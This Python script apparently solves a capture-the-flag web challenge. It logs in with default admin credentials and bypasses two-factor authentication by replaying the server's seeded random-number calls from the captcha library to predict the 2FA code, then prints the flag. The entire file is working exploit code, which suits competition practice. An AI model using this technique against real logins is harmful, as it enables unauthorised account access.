import requests
import re
import random
from PIL import Image

def getImg(URL):
    return Image.open(requests.get(URL, stream=True).raw)

def main():
    URL = 'http://e21e307a-8f35-4254-ae43-4126ea9a3dbf.challenge.tscctf.com'
    sess = requests.Session()
    def login():
        LOGIN_URL = URL+'/login/'

        r = sess.get(LOGIN_URL)
        csrf_token = re.findall(r'name="csrfmiddlewaretoken" value="(.+?)"', r.text)[0]
        captcha_img = re.findall(r'<img src="(.+?)" alt="captcha" class="captcha" />', r.text)[0]
        key = re.findall(r'captcha/image/(.+?)/', captcha_img)[0]

        img = getImg(URL+'/'+captcha_img)
        size = img.size
        img.show()
        captcha_ans = input(f'Please solve this captcha: {URL}/{captcha_img}')

        data = {
            "username": "admin",
            "password": "admin",
            "captcha_0": key,
            "captcha_1": captcha_ans,
            "csrfmiddlewaretoken": csrf_token,
        }
        r = sess.post(LOGIN_URL, data=data)
        if not '2FA code' in r.text:
            return login()
        return key, size
    
    def _2fa(code):
        _2FA_URL = URL+'/2fa/'
        data = {
            "code": code,
            "csrfmiddlewaretoken": sess.cookies['csrftoken'],
        }
        r = sess.post(_2FA_URL, data=data)
        if not 'Dashboard' in r.text:
            return False
        return r.text
    
    def get_2fa(key, size):
        CAPTCHA_LETTER_ROTATION = random.seed(0) or (random.randrange(-35, 0), random.randrange(0, 35))
        random.seed(key)

        CAPTCHA_FONT_PATH = ['fonts/Vera.ttf'] + '/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf  /usr/share/fonts/truetype/dejavu/DejaVuSans.ttf  /usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf  /usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf  /usr/share/fonts/truetype/dejavu/DejaVuSerif-Bold.ttf  /usr/share/fonts/truetype/dejavu/DejaVuSerif.ttf'.split()
        
        # :57
        random.choice(CAPTCHA_FONT_PATH)

        # /usr/local/lib/python3.9/site-packages/captcha/views.py:92
        len_captcha = int(input(f'Please input the length of captcha: '))
        for i in range(len_captcha):
            random.randrange(*CAPTCHA_LETTER_ROTATION)

        # /usr/local/lib/python3.9/site-packages/captcha/helpers.py:82
        for _ in range(2):
            for p in range(int(size[0] * size[1] * 0.1)):
                random.randint(0, size[0]), random.randint(0, size[1])


        code = random.randint(100000, 2**1024)
        res = _2fa(code)
        # print(res)
        flag = re.findall(r'flag{.+}|TSC{.+}', res)[0]
        
        print(flag)
        print(code)


    key, size = login()
    get_2fa(key, size)

main()